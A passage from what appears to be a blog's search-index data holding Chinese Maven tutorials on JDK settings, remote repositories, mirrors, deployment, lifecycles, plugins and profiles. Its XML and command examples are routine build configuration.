表示项目构件开始时间;\n${maven.build.timestamp.format} 表示属性${maven.build.timestamp}的展示格式,默认值为yyyyMMdd-HHmm,可自定义其格式\n```\n\n\n\n\n\n# Maven项目中指定JDK\n\n## 默认版本\n\nMaven项目中，编译器和JRE的版本默认为1.5 (所以Alt + F5刷新项目后，多个参数值会变成1.5)，参数如下(选中项目，Alt + Enter，查看项目属性)\n\n```\nJava Build Path下的Libraries下的JRE System Lirbrary的版本。\nJava Compiler下的JDK Compiler的版本。\nMaven下的Project Facts下的Java的版本。\n```\n\n##  项目中配置JDK版本\n\n配置properties节点下的maven编译器信息\n\n```xml\n<properties>\n  <java.version>1.8</java.version>\n</properties>\n```\n\n配置`build>plugins>plugins>configuration`节点下的source和target节点值\n\n```xml\n<build>\n  <plugins>\n    <plugin>\n      <groupId>org.apache.maven.plugins</groupId>\n      <artifactId>maven-compiler-plugin</artifactId>\n      <version>2.3.2</version>\n      <configuration>\n        <source>${java.version}</source>\n        <target>${java.version}</target>\n      </configuration>\n    </plugin>\n  </plugins>\n</build>\n```\n\n","tags":["Maven"],"categories":["框架|中间件","Maven"]},{"title":"Maven基础","url":"/20250619/195cf5d1.html","content":"\n\n\n# 命令行创建项目\n\n> maven3.0.5以上版本舍弃了create，使用generate生成项目\n\n命令行执行 `mvn archetype:generate `命令，使用互动方依次输入参数，或者直接指定参数\n\n```bash\nmvn archetype:generate -DgroupId=com.local -DartifactId=learn \\\n      -DpackageName=com.local.com.local -DarchetypeArtifactId:maven-archetype-quickstart \\\n      -Dversion=0.0.1-SNAPSHOT\n```\n\n\n\n# 建立Maven环境\n\n##  1、项目中远程仓库的配置\n\n在平时的开发中，我们往往不会使用默认的中央仓库，默认的中央仓库访问的速度比较慢，访问的人或许很多，有时候也无法满足我们项目的需求，可能项目需要的某些构件中央仓库中是没有的，而在其他远程仓库中有。这时，可以在`pom.xml`中配置该仓库，代码如下：\n\n```xml\n<!-- 配置远程仓库 -->\n<repositories>\n    <repository>\n        <id>jboss</id>\n        <name>JBoss Repository</name>\n        <url>http://repository.jboss.com/maven2/</url>\n        <releases>\n            <enabled>true</enabled>\n            <updatePolicy>daily</updatePolicy>\n        </releases>\n        <snapshots>\n            <enabled>false</enabled>\n            <checksumPolicy>warn</checksumPolicy>\n        </snapshots>\n        <layout>default</layout>\n    </repository>\n</repositories>\n```\n\n\n\n| 配置                                    | 说明                                                         |\n| --------------------------------------- | ------------------------------------------------------------ |\n| repository                              | 在repositories元素下，可以使用repository子元素声明一个或者多个远程仓库。 |\n| id                                      | 仓库声明的唯一id。<br />尤其需要注意的是，Maven自带的中央仓库使用的id为central，如果其他仓库声明也使用该id，就会覆盖中央仓库的配置。 |\n| name                                    | 仓库的名称，让我们直观方便的知道仓库是哪个，暂时没发现其他太大的含义。 |\n| url                                     | 指向了仓库的地址，一般来说，该地址都基于http协议，Maven用户都可以在浏览器中打开仓库地址浏览构件。 |\n| **releases 和 snapshots**               | 用来控制Maven对于发布版构件和快照版构件的下载权限。<br />- `releases`的enable设置为true，表示开启JBoss仓库的`发布版本`下载支持，<br />- `snapshots`的enabled值为false，表示关闭JBoss仓库的`快照版本`的下载支持。<br />根据该配置，Maven只会从JBoss仓库下载发布版的构件，而不会下载快照版的构件。 |\n| layout                                  | 元素值`default`表示仓库的布局是Maven2及Maven3的默认布局，而不是Maven1的布局。<br />基本不会用到Maven1的布局。 |\n| releases或者snapshots的`updatePolicy`   | 用来配置Maven从远处仓库检查更新的频率<br />默认值是`daily`，表示Maven每天检查一次。<br />`never`：从不检查更新；<br />`always`：每次构建都检查更新 |\n| releases或者snapshots的`checksumPolicy` | 配置Maven检查校验和文件的策略。<br />当构建被部署到Maven仓库中时，会同时部署对应的检验和文件。<br />在下载构件的时候，Maven会验证校验和文件，如果校验和验证失败，当checksumPolicy的值为<br />`warn`（默认）：Maven会在执行构建时输出警告信息<br />`fail`：Maven遇到校验和错误就让构建失败<br />`ignore`：使Maven完全忽略校验和错误 |\n\n\n\n##  2、Maven私服的认证\n\n大部分公共的远程仓库无须认证就可以直接访问，但我们在平时的开发中往往会架设自己的Maven私服，出于安全方面的考虑，我们需要提供认证信息才能访问这样的远程仓库。\n\n配置认证信息和配置远程仓库不同，远程仓库可以直接在`pom.xml`中配置，但是认证信息必须配置在`settings.xml`文件中。\n\n这是因为pom往往是被提交到代码仓库中供所有成员访问的，而`settings.xml`一般只存在于本机。因此，在`settings.xml`中配置认证信息更为安全。\n\nMaven使用`settings.xml`文件中的`servers`元素及其子元素`server`配置仓库认证信息。\n\n```\n<settings>\n     ...\n     <!--配置远程仓库认证信息-->\n     <servers>\n         <server>\n             <id>releases</id>\n             <username>admin</username>\n             <password>admin123</password>\n         </server>\n     </servers>\n     ...\n</settings>123456789101112\n```\n\n上面代码我们配置了一个`id`为`releases`的远程仓库认证信息。认证用户名为admin，认证密码为admin123。\n\n这里的关键是`id`元素，`settings.xml`中`server`元素的`id`必须与`pom.xml`中需要认证的`repository`元素的`id`完全一致。\n\n正是这个id将认证信息与仓库配置联系在了一起。\n\n##  3、部署构件至私服\n\n我们使用自己的远程仓库的目的就是在远程仓库中部署我们自己项目的构件以及一些无法从外部仓库直接获取的构件。这样才能在开发时，供其他对团队成员使用。\n\nMaven除了能对项目进行编译、测试、打包之外，还能将项目生成的构件部署到远程仓库中。\n\n**首先，需要编辑项目的`pom.xml`文件。配置`distributionManagement`元素**，代码如下：\n\n```xml\n<distributionManagement>\n        <repository>\n            <id>releases</id>\n            <name>public</name>\n            <url>http://59.50.95.66:8081/nexus/content/repositories/releases</url>\n        </repository>\n        <snapshotRepository>\n            <id>snapshots</id>\n            <name>Snapshots</name>\n            <url>http://59.50.95.66:8081/nexus/content/repositories/snapshots</url>\n        </snapshotRepository>\n</distributionManagement>123456789101112\n```\n\n`distributionManagement`包含`repository`和`snapshotRepository`子元素。\n\n`repository`： 表示发布版本（稳定版本）构件的仓库\n\n`snapshotRepository`：表示快照版本（开发测试版本）的仓库\n\n这两个元素都需要配置id、name和url。`id`为远程仓库的唯一标识，`name`是为了方便人阅读，关键的`url`表示该仓库的地址。\n\n往远程仓库部署构件的时候，往往需要认证，配置认证的方式同上。\n\n配置正确后，运行命令`mvn clean deploy`，Maven就会将项目构建输出的构件部署到配置对应的远程仓库，如果项目当前的版本是快照版本，则部署到快照版本的仓库地址，否则就部署到发布版本的仓库地址。\n\n##  4、配置远程仓库的镜像\n\n**如果仓库X可以提供仓库Y存储的所有内容，那么就可以认为X是Y的一个镜像**。换句话说，任何一个可以从仓库Y获得的构件，都能够从它的镜像中获取。\n\n举个例子，http://maven.oschina.net/content/groups/public/ 是中央仓库http://repo1.maven.org/maven2/ 在中国的镜像，由于地理位置的因素，该镜像往往能够提供比中央仓库更快的服务。\n\n因此，可以配置Maven使用该镜像来替代中央仓库。编辑`settings.xml`，代码如下：\n\n```xml\n<mirrors>\n     <mirror>\n      <id>maven.oschina.net</id>\n      <name>maven mirror in China</name>\n      <url>http://maven.oschina.net/content/groups/public/</url>\n      <mirrorOf>central</mirrorOf>\n    </mirror>\n</mirrors>\n```\n\n\n\n| 配置            | 说明                                                         |\n| --------------- | ------------------------------------------------------------ |\n| **`mirrorOf` ** | 该例中，`mirrorOf` 的值为central，表示该配置为中央仓库的镜像，任何对于中央仓库的请求都会转至该镜像，用户也可以使用同样的方法配置其他仓库的镜像 |\n| `id`            | 表示镜像的唯一标识符                                         |\n| `name`          | 表示镜像的名称                                               |\n| `url`           | 表示镜像的地址                                               |\n\n关于镜像的一个更为常见的用法是结合私服。由于私服可以代理任何外部的公共仓库(包括中央仓库)，因此，对于组织内部的Maven用户来说，使用一个私服地址就等于使用了所有需要的外部仓库，这可以将配置集中到私服，从而简化Maven本身的配置。在这种情况下，任何需要的构件都可以从私服获得，私服就是所有仓库的镜像。这时，可以配置这样的一个镜像：\n\n```xml\n<!--配置私服镜像-->\n<mirrors> \n    <mirror>  \n        <id>nexus</id>  \n        <name>internal nexus repository</name>  \n        <url>http://183.238.2.182:8081/nexus/content/groups/public/</url>  \n        <mirrorOf>*</mirrorOf>  \n    </mirror>  \n</mirrors>\n```\n\n该例中`<mirrorOf>`的值为星号，表示该配置是所有Maven仓库的镜像，任何对于远程仓库的请求都会被转至http://183.238.2.182:8081/nexus/content/groups/public/。\n\n如果该镜像仓库需要认证，则配置一个id为nexus的认证信息即可。\n\n需要注意的是，由于镜像仓库完全屏蔽了被镜像仓库，当镜像仓库不稳定或者停止服务的时候，Maven仍将无法访问被镜像仓库，因而将无法下载构件。\n\n##  5、可用的Maven镜像仓库\n\n| ID        | mirror                                                       |\n| --------- | ------------------------------------------------------------ |\n| repo2     | <mirror><br/>    <id>repo2</id><br/>    <mirrorOf>central</mirrorOf><br/>    <name>Human Readable Name for this Mirror.</name><br/>    <url>http://repo2.maven.org/maven2/</url><br/></mirror> |\n| ibiblio   | <mirror><br/>    <id>ibiblio</id><br/>    <mirrorOf>central</mirrorOf><br/>    <name>Human Readable Name for this Mirror.</name><br/>    <url>http://mirrors.ibiblio.org/pub/mirrors/maven2/</url><br/></mirror> |\n| jboss     | <mirror><br/>    <id>jboss-public-repository-group</id><br/>    <mirrorOf>central</mirrorOf><br/>    <name>JBoss Public Repository Group</name><br/>    <url>http://repository.jboss.org/nexus/content/groups/public</url><br/></mirror> |\n| JBossJBPM | <mirror><br/>    <id>JBossJBPM</id><br/>    <mirrorOf>central</mirrorOf><br/>    <name>JBossJBPM Repository</name><br/>    <url>https://repository.jboss.org/nexus/content/repositories/releases/</url><br/></mirror> |\n|           |                                                              |\n\n\n\n##  6、仓库搜索服务地址\n\n| 名称           | 地址                             |\n| -------------- | -------------------------------- |\n| Sonatype Nexus | https://repository.sonatype.org/ |\n| MVNrepository  | http://mvnrepository.com/        |\n\n\n\n# Maven生命周期\n\n\n\n\n\n在有关Maven的日常使用中，命令行的输入往往就对应了生命周期，如`mvn package`就表示执行默认[生命周期](https://so.csdn.net/so/search?q=生命周期&spm=1001.2101.3001.7020)阶段package。\n\nMaven的生命周期是抽象的，其实际行为都由插件来完成，如`package阶段`的任务可能就会由`maven-jar-plugin`完成。`生命周期`和`插件`两者协同工作，密不可分。\n\n## 1、Maven生命周期\n\n我们在开发项目的时候，我们不断地在经历编译、测试、打包、部署等过程，maven的生命周期就是对所有这些过程的一个抽象与统一，她的**生命周期包含项目的清理、初始化、编译、测试、打包、集成测试、验证、部署、站点生成等几乎所有的过程**，而且maven的生命周期是及其灵活，她**生命周期的每个阶段是通过插件来实现的**，maven也内置了很多插件，所以我们在项目进行编译、测试、打包的过程是没有感觉到。像编译是通过maven-compile-plugin实现的、测试是通过maven-surefire-plugin实现的。\n\n**Maven有三套相互独立的生命周期**，请注意这里说的是“三套”，而且“相互独立”，初学者容易将Maven的生命周期看成一个整体，其实不然。这三套生命周期分别是：\n\n- Clean Lifecycle 在进行真正的构建之前进行一些清理工作。\n- Default Lifecycle 构建的核心部分，编译，测试，打包，部署等等。\n- Site Lifecycle 生成项目报告，站点，发布站点。\n\n我再次强调一下它们是`相互独立`的，你可以仅仅调用clean来清理工作目录，仅仅调用site来生成站点。当然你也可以直接运行`mvn clean install site`运行所有这三套生命周期。\n\n> 在一个生命周期中，运行某个阶段的时候，它之前的所有阶段都会被运行。\n>\n> 也就是说，`mvn clean`等同于 `mvn pre-clean clean`，如果我们运行`mvn post-clean`，那么`pre-clean`、`clean`都会被运行。\n\n### 生命周期：Clean\n\n1. pre-clean 执行一些需要在clean之前完成的工作\n2. clean 移除所有上一次构建生成的文件\n3. post-clean 执行一些需要在clean之后立刻完成的工作\n\n### 生命周期：Site\n\n1. pre-site 执行一些需要在生成站点文档之前完成的工作。\n\n2. site 生成项目的站点文档。\n3. post-site 执行一些需要在生成站点文档之后完成的工作，并且为部署做准备。\n4. site-deploy 将生成的站点文档部署到特定的服务器上。\n\n### 生命周期：`Default`\n\n- validate\n\n- initialize\n\n- generate-sources\n\n- process-sources 处理项目主资源文件。一般来说，是对`src/main/resources`目录的内容进行变量替换等工作后，复制到项目输出的`主classpath目录`中。\n\n- generate-resources\n\n- process-resources\n\n- `compile` 编译项目的源代码。一般来说，是编译`src/main/java`目录下的Java文件至项目输出的`主classpath目录`中。\n\n- process-classes\n\n- generate-test-sources\n\n- process-test-sources 处理项目测试资源文件。一般来说，是对`src/test/resources`目录的内容进行变量替换等工作后，复制到项目输出的`测试classpath目录`中。\n\n- generate-test-resources\n\n- process-test-resources\n\n- test-compile 编译项目的测试源代码。一般来说，是编译`src/test/java`目录下的Java文件至项目输出的`测试classpath目录`中。\n\n- process-test-classes\n\n- `test` 使用合适的单元测试框架运行测试。这些测试代码不会被打包或部署。\n\n- prepare-package\n\n- package 接受编译好的代码，打包成可发布的格式，如 JAR 。\n\n- pre-integration-test\n\n- integration-test\n\n- post-integration-test\n\n- verify\n\n- `install` 将包安装至本地仓库，以让其它项目依赖。\n\n- `deploy` 将最终的包复制到远程的仓库，以让其它开发人员与Maven项目使用。\n\n  \n\n基本上，根据名称我们就能猜出每个阶段的用途，关于阶段的详细解释以及其她阶段的解释，请参考 http://maven.apache.org/guides/introduction/introduction-to-the-lifecycle.html 。\n\n记住，运行任何一个阶段的时候，它前面的所有阶段都会被运行，这也就是为什么我们运行`mvn install`的时候，代码会被编译，测试，打包。\n\n此外，Maven的插件机制是完全依赖Maven的生命周期的，因此理解生命周期至关重要，接下来我将会进一步解释Maven的插件机制。\n\n## 2、命令行与生命周期\n\n从命令行执行Maven任务的最主要方式就是调用Maven的生命周期阶段。需要注意的是，**各个生命周期是相互独立的**，而**一个生命周期的阶段是有前后依赖关系的**。\n\n下面以一些常见的Maven命令为例，解释其执行的生命周期阶段：\n\n\n\n| 命令                             | 说明                                                         |\n| -------------------------------- | ------------------------------------------------------------ |\n| **mvn clean**                    | 该命令调用`clean`生命周期的`clean`阶段。<br />实际执行的阶段为`clean`生命周期的`pre-clean`和`clean`阶段。 |\n| **mvn test**                     | 该命令调用`default生命周期`的`test阶段`。<br />实际执行的阶段为default生命周期的`validate`、`initialize`等，直到`test`的所有阶段。<br />这也解释了为什么在执行测试的时候，项目的代码能够自动得以编译。 |\n| **mvn clean install**            | 该命令调用`clean生命周期`的`clean阶段`和`default生命周期`的`install阶段`。<br />实际执行的阶段为clean生命周期的pre-clean、clean阶段，以及default生命周期的从validate至install的所有阶段。<br /><br />该命令结合了两个生命周期，在执行正在的项目构建之前清理项目是一个很好的实践。 |\n| **mvn clean deploy site-deploy** | 该命令调用`clean生命周期`的`clean阶段`、`default生命周期`的`deploy阶段`，以及`site生命周期`的`site-deploy阶段`。<br />实际执行的阶段为clean生命周期的pre-clean、clean阶段，default生命周期的所有阶段，以及site生命周期的所有阶段。<br /><br />该命令结合了Maven所有三个生命周期，且deploy为default生命周期的最后一个阶段，site-deploy为site生命周期的最后一个阶段。 |\n\n由于Maven中主要的生命周期阶段并不多，而常用的Maven命令实际都是基于这些阶段简单组合而成的，因此只要对Maven生命周期有一个基本的理解，读者就可以正确而熟练地使用Maven命令。\n\n\n\n\n\n\n\n# Maven插件机制\n\n\n\n> 如何将插件与 Maven 的构建生命周期绑定在一起呢？通过将插件的目标（goal）与 build lifecycle 中 phase 绑定到一起，这样，当要执行某个 phase 时，就调用插件来完成绑定的目标。\n\n通过上面的生命周期我们可以了解到，不同的生命周期绑定不同的插件；同时我们知道，下载下来的maven核心的东西不过3-4M，它主要就是通过插件来完成这些工作的，一旦碰到没有的插件，它会跑到相应的地方下载，然后来完成整个过程。那么在我们的项目中如何使用插件呢？\n\n打开**`http://maven.apache.org/plugins/index.html `**网址，可以看到apache下面的很多插件。\n\n\n\n## [spring-boot-maven-plugin](https://docs.spring.io/spring-boot/docs/current/maven-plugin/reference/htmlsingle)\n\n> 要求Java 8, Maven 3.2及以后\n\n`spring-boot-maven-plugin` 的构建目标：\n\n| Goal                                                         | Description                                                  |\n| :----------------------------------------------------------- | :----------------------------------------------------------- |\n| [spring-boot:build-info](https://docs.spring.io/spring-boot/docs/current/maven-plugin/reference/htmlsingle/#goals-build-info) | 生成构建信息`build-info.properties `可供actuator 使用        |\n| [spring-boot:help](https://docs.spring.io/spring-boot/docs/current/maven-plugin/reference/htmlsingle/#goals-help) | 显示`spring-boot-maven-plugin`的帮助信息。<br />调用`mvn spring-boot:help -Ddetail=true -Dgoal=<goal-name>`显示参数详细信息。 |\n| [spring-boot:repackage](https://docs.spring.io/spring-boot/docs/current/maven-plugin/reference/htmlsingle/#goals-repackage) | 重新打包能用于从命令行使用`java -jar `执行的`JAR`和`WAR`文件。<br />使用`layout=NONE`也可以简单地用于打包带有嵌套依赖项的JAR（并且没有主类，因此不可执行）。 |\n| [spring-boot:run](https://docs.spring.io/spring-boot/docs/current/maven-plugin/reference/htmlsingle/#goals-run) | 运行你的Springboot应用                                       |\n| [spring-boot:start](https://docs.spring.io/spring-boot/docs/current/maven-plugin/reference/htmlsingle/#goals-start) | 启动spring应用程序。与“运行”目标相反，这不会阻塞，并允许其他目标对应用程序进行操作。<br />此目标通常用于集成测试场景，其中应用程序在测试案例之前启动，在测试案例之后停止。 |\n| [spring-boot:stop](https://docs.spring.io/spring-boot/docs/current/maven-plugin/reference/htmlsingle/#goals-stop) | 停止由“start”目标启动的应用程序。通常在测试案例完成后调用。  |\n\n指定入口Class文件\n\n```xml\n<build>\n    <plugins>\n        <plugin>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-maven-plugin</artifactId>\n            <version>${springboot.version}</version>\n            <configuration>\n                <mainClass>com.local.learn.producer.ProducerApplication</mainClass>\n            </configuration>\n            <executions>\n                <execution>\n                    <goals>\n                        <goal>repackage</goal>\n                    </goals>\n                </execution>\n            </executions>\n        </plugin>\n    </plugins>\n</build>\n```\n\n\n\n## maven-source-plugin\n\n以 [`source`](https://maven.apache.org/plugins/maven-source-plugin/) (maven-source-plugin)为例：\n\nSource插件是对源代码进行打包的一个插件，默认情况下，它会将生成的源代码放在工程目录的target下面。\n\nSource插件具有五个**目标**：\n\n- [source:aggregate](http://maven.apache.org/plugins/maven-source-plugin/aggregate-mojo.html) aggregrates sources for all modules in an aggregator project.\n- [source:jar](http://maven.apache.org/plugins/maven-source-plugin/jar-mojo.html) 用于将项目的主要源代码捆绑到JAR中\n- [source:test-jar](http://maven.apache.org/plugins/maven-source-plugin/test-jar-mojo.html) 将项目的测试源绑定到JAR中\n- [source:jar-no-fork](http://maven.apache.org/plugins/maven-source-plugin/jar-no-fork-mojo.html) 类似于`jar`，但不派生构建生命周期。\n- [source:test-jar-no-fork](http://maven.apache.org/plugins/maven-source-plugin/test-jar-no-fork-mojo.html) 类似于`test-jar`，但不派生构建生命周期。\n\n在我们的工程`pom.xml`中，在后面引入下面这段配置：\n\n```xml\n<build>\n    <plugins>\n        <plugin>\n            <groupId>org.apache.maven.plugins</groupId>\n            <artifactId>maven-source-plugin</artifactId>\n            <version>2.1.2</version>\n        </plugin>\n    </plugins>\n</build>\n```\n\n上面这段配置就是**对源码进行打包的插件**，我们运行`source:jar-no-fork`，那么在项目的目录底下的`target`会生成一个类似于`user-core-0.0.1-SNAPSHOT-sources.jar`这样的文件，即项目的源文件。\n\n那么如何将这个插件与特定的生命周期绑定呢？我们来看下面这段配置：\n\n```xml\n<build>\n    <plugins>\n        <plugin>\n            <groupId>org.apache.maven.plugins</groupId>\n            <artifactId>maven-source-plugin</artifactId>\n            <version>3.2.0</version>\n            <!-- 绑定source插件到Maven的生命周期,并在生命周期后执行绑定的source的goal -->\n            <executions>\n                <execution>\n                    <!-- 绑定source插件到Maven的生命周期 -->\n                    <phase>compile</phase>\n                    <!--在生命周期后执行绑定的source插件的goals -->\n                    <goals>\n                        <goal>jar-no-fork</goal>\n                    </goals>\n                </execution>\n            </executions>\n        </plugin>\n    </plugins>\n</build>\n```\n\n通过这段配置，大家可以用`mvn package`将项目打包的同时会将源代码进行打包。（生成一个可执行jar包和一个sources.jar）\n\n![image-20230309172623361](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230309172623361.png) \n\nexecutions 底下的每个 execution代表着一项执行任务，phase 用于指定绑定到生命周期的哪个阶段，goal用于指明执行插件目标 \n\n\n\n\n\n## <span id=\"maven-jar-plugin\">maven-jar-plugin</span>\n\n> 建立可执行JAR\n\n```xml\n<build>\n    <plugins>\n        <plugin>\n            <groupId>org.apache.maven.plugins</groupId>\n            <artifactId>maven-jar-plugin</artifactId>\n            <version>3.3.0</version>\n            <configuration>\n                <archive>\n                    <manifest>\n                        <addClasspath>true</addClasspath>\n                        <!-- main函数所在的类 -->\n                        <mainClass>org.local.Main</mainClass>\n                    </manifest>\n                </archive>\n            </configuration>\n        </plugin>\n    </plugins>\n</build>\n```\n\n\n\n\n\n## maven-resources-plugin\n\n参考：https://www.cnblogs.com/LQBlog/p/14775703.html\n\n### 修改默认读取资源地址\n\n> 能够将Maven项目中的各种资源文件复制到指定的输出目录中\n\n```xml\n<project ...>\n    <build>\n     \t  <resources>\n            <resource>\n                <directory>src/main/java</directory>\n                <includes>\n                    <include>**/*.xml</include>\n                </includes>\n            </resource>\n          \t<resource>\n                <directory>src/main/webapp</directory>\n                <targetPath>META-INF/resources</targetPath>\n                <includes>\n                    <include>**/**</include>\n                </includes>\n            </resource>\n            <resource>\n                <directory>src/main/resources</directory>\n                <includes>\n                    <include>**/**</include>\n                </includes>\n            </resource>\n        </resources>\n    </build>\n</project>\n\n```\n\n### 打包排除和包含文件\n\n```xml\n<build>\n    <resources>\n        <resource>\n            <directory>src/main/resources</directory>\n            <includes>\n              <include>**/*.txt</include>\n              <include>**/*.rtf</include>\n            </includes>\n            <excludes>\n              <exclude>**/*.bmp</exclude>\n              <exclude>**/*.jpg</exclude>\n              <exclude>**/*.jpeg</exclude>\n              <exclude>**/*.gif</exclude>\n            </excludes>\n        </resource>\n    <resources>\n</build>\n```\n\n### 改变输出目录\n\n```xml\n<resource>\n    <directory>src/main/resources</directory>\n    <targetPath>abc</targetPath>\n</resource>\n```\n\n如: ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/779774-20210616144715540-1984363604.png)  打包后  ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/779774-20210616144726492-284896033.png) \n\n```xml\n<!-- 生产环境指定profile为acm,接入阿里云应用配置服务 -->\n<profiles>\n    <profile>\n        <id>acm</id>\n        <dependencies>\n            <dependency>\n                <groupId>org.springframework.cloud</groupId>\n                <artifactId>spring-cloud-starter-alibaba-nacos-config</artifactId>\n                <version>0.2.1.RELEASE</version>\n            </dependency>\n        </dependencies>\n        <build>\n            <resources>\n                <resource>\n                    <directory>src/main/resources/canal/pro/</directory>\n                    <targetPath>canal</targetPath>\n                </resource>\n                <resource>\n                    <directory>src/main/resources</directory>\n                    <excludes>\n                        <exclude>canal/pro/*.yml</exclude>\n                        <exclude>canal/test/*.yml</exclude>\n                    </excludes>\n                </resource>\n            </resources>\n        </build>\n    </profile>\n  \n    <profile>\n        <id>test</id>\n        <activation>\n            <!--没有指定变量默认激活-->\n            <activeByDefault>true</activeByDefault>\n        </activation>\n        <build>\n            <resources>\n                <resource>\n                    <directory>src/main/resources/canal/test/</directory>\n                    <targetPath>canal</targetPath>\n                </resource>\n                <resource>\n                    <directory>src/main/resources</directory>\n                    <excludes>\n                        <exclude>canal/test/*.yml</exclude>\n                        <exclude>canal/pro/*.yml</exclude>\n                    </excludes>\n                </resource>\n            </resources>\n        </build>\n    </profile>\n</profiles>\n```\n\n\n\n### 占位符替换\n\n1. properties中定义，变量值\n\n   src/main/resources 下的yml配置文件 打包后则会默认填充\n\n   ```yaml\n   spring:\n     profiles:\n       active: ${spring.profiles.active}\n       custom: ${custom}\n   ```\n\n   ```xml\n   <!--定义占位符内容-->    \n   <properties>\n       <java.version>1.8</java.version>\n       <custom>version</custom>\n       <spring.profiles.active>pro</spring.profiles.active>\n   </properties>\n   <!--也可以定义在profile里面 如果写在profile就是针对profile的build-->\n   <build>\n       <resources>\n           <resource>\n               <directory>src/main/resources</directory>\n             \t<includes>\n                   <include>*.yml</include>\n               </includes>\n               <!-- 允许替换占位符内容（默认false），占位符默认是 ${变量名称} 这样的形式-->\n               <!-- http://maven.apache.org/plugins/maven-resources-plugin/examples/filter.html --> \n               <!-- maven会自动读取includes配置文件，然后解析其中的占位符，使用上面pom文件中定义的属性进行替换 -->\n               <filtering>true</filtering>\n               <!--可用于排除某些-->\n   <!--                <excludes>-->\n   <!--                    <exclude>file</exclude>-->\n   <!--                </excludes>-->\n           </resource>\n       </resources>\n       <plugins>\n           <plugin>\n               <groupId>org.springframework.boot</groupId>\n               <artifactId>spring-boot-maven-plugin</artifactId>\n           </plugin>\n           <plugin>\n               <groupId>org.apache.maven.plugins</groupId>\n               <artifactId>maven-resources-plugin</artifactId>\n               <version>3.1.0</version>\n               <!--使用默认的变量分割符： ${}，可以自己定义格式-->\n               <configuration>\n                   <useDefaultDelimiters>true</useDefaultDelimiters>\n               </configuration>\n           </plugin>\n       </plugins>\n   </build>\n   ```\n\n   \n\n   \n\n2. 多环境配置 只需要在profile定义即可\n\n    `mvn clean install -Dmaven.test.skip -Denv=dev`  打包后 则会填充对应的的占位符，**注：`profile`的优先级比全局的`properties`定义优先级要高**\n\n   ```xml\n   <profiles>\n       <profile>\n           <id>dev</id>\n           <activation>\n               <!--没有指定变量默认激活-->\n               <activeByDefault>true</activeByDefault>\n               <!--maven打包的变量名和参数名字 如: mvn clean install -Dmaven.test.skip -Denv=dev-->\n               <property>\n                   <name>env</name>\n                   <value>dev</value>\n               </property>\n           </activation>\n           <!--占位符定义-->\n           <properties>\n               <spring.profiles.active>dev</spring.profiles.active>\n               <name>dev</name>\n           </properties>\n       </profile>\n     \n       <profile>\n           <id>test</id>\n           <activation>\n               <!--没有指定变量默认激活-->\n               <activeByDefault>true</activeByDefault>\n               <!--maven打包的变量名和参数名字 如: mvn clean install -Dmaven.test.skip -Denv=dev-->\n               <property>\n                   <name>env</name>\n                   <value>test</value>\n               </property>\n           </activation>\n           <!--占位符定义-->\n           <properties>\n               <spring.profiles.active>test</spring.profiles.active>\n               <name>version2</name>\n           </properties>\n       </profile>\n     \n       <profile>\n           <id>pro</id>\n           <activation>\n               <!--没有指定变量默认激活-->\n               <activeByDefault>true</activeByDefault>\n               <!--maven打包的变量名和参数名字 如: mvn clean install -Dmaven.test.skip -Denv=dev-->\n               <property>\n                   <name>env</name>\n                   <value>pro</value>\n               </property>\n           </activation>\n           <!--占位符定义-->\n           <properties>\n               <spring.profiles.active>pro</spring.profiles.active>\n               <name>version3</name>\n           </properties>\n       </profile>\n   </profiles>\n   ```\n\n\n\n\n\n# 附录\n\n## Maven 命令一览\n\n| 参数                        | 说明                                                         |\n| --------------------------- | ------------------------------------------------------------ |\n| mvn artchetype:generate     | 使用交互式的方法建立工程，代替artchetype:create              |\n| mvn compile                 | 编译工程                                                     |\n| mvn clean                   | 清理生成的文件，一般与package install等命令一起使用          |\n| mvn test                    | 测试src/main/test下的文件                                    |\n| mvn package                 | 生成target目录，编译、测试代码，生成测试报告，生成jar/war文件 |\n| mvn install                 | 将工程打包并部署到本地库中                                   |\n| mvn help:effective-pom      | 实际的pom文件，显示所有的默认配置                            |\n| mvn help:effective-settings | 运行时使用setting文件                                        |\n| mvn eclipse:eclipse         | 生成eclipse工程文件                                          |\n| mvn help:describe           | 显示某个插件（目标）的功能                                   |\n| mvn jetty:run               | 启动jetty容器，可以在测试时代替tomcat                        |\n| mvn tomcat:run              | 启动tomcat容器                                               |\n| mvn Debug                   | tomcat:run可以在eclipse中设置断点进行调试                    |\n| mvn dependency:analyze      | 查看工程所依赖的插件，进行pom优化时可以用到                  |\n| mvn dependency:sources      | 自动寻找并下载jar包的源码                                    |\n| mvn dependency:resolved     | 查看已经解决的依赖                                           |\n| mvn dependency:tree         | 查看依赖树，可以分析出间接依赖关系                           |\n| mvn exec:java               | 运行指定的应用                                               |\n| mvn assembly:assembly       | 生成一个单独的可运行的jar包                                  |\n\n\n\n## 命令行创建Maven项目\n\n```sh\nmvn archetype:generate -DgroupId=com.test -DartifactId=HelloWorld -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false\n```\n\n","tags":["Maven"],"categories":["框架|中间件","Maven"]},{"title":"Maven使用场景记录","url":"/20250619/4a3536f5.html","content":"\n# Compile的设置\n\n```xml\n<project ...>\n    <build>\n        <plugins>\n            <plugin>\n                <groupId>org.apache.maven.plugins</groupId>\n                <artifactId>maven-compiler-plugin</artifactId>\n                <version>3.1</version>\n                <configuration>\n                    <source>${maven.compiler.source}</source>\n                    <target>${maven.compiler.target}</target>\n                    <encoding>${project.build.sourceEncoding}</encoding>\n                </configuration>\n            </plugin>\n        </plugins>\n    </build>\n</project>\t\n```\n\n\n\n# SpringBoot项目打包\n\n> 使用spring-boot-maven-plugin插件，指定运行主类\n\n```xml\n<build>\n    <plugins>\n        <plugin>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-maven-plugin</artifactId>\n            <version>${springboot.version}</version>\n            <configuration>\n                <mainClass>com.local.learn.producer.ProducerApplication</mainClass>\n            </configuration>\n            <executions>\n                <execution>\n                    <goals>\n                        <goal>repackage</goal>\n                    </goals>\n                </execution>\n            </executions>\n        </plugin>\n    </plugins>\n</build>\n```\n\n\n\n# 建立可執行JAR\n\n> 使用maven-jar-plugin 插件，main函数作为入口\n\n```xml\n<build>\n    <plugins>\n        <plugin>\n            <groupId>org.apache.maven.plugins</groupId>\n            <artifactId>maven-jar-plugin</artifactId>\n            <version>3.3.0</version>\n            <configuration>\n                <archive>\n                    <manifest>\n                        <addClasspath>true</addClasspath>\n                        <!-- main函数所在的类 -->\n                        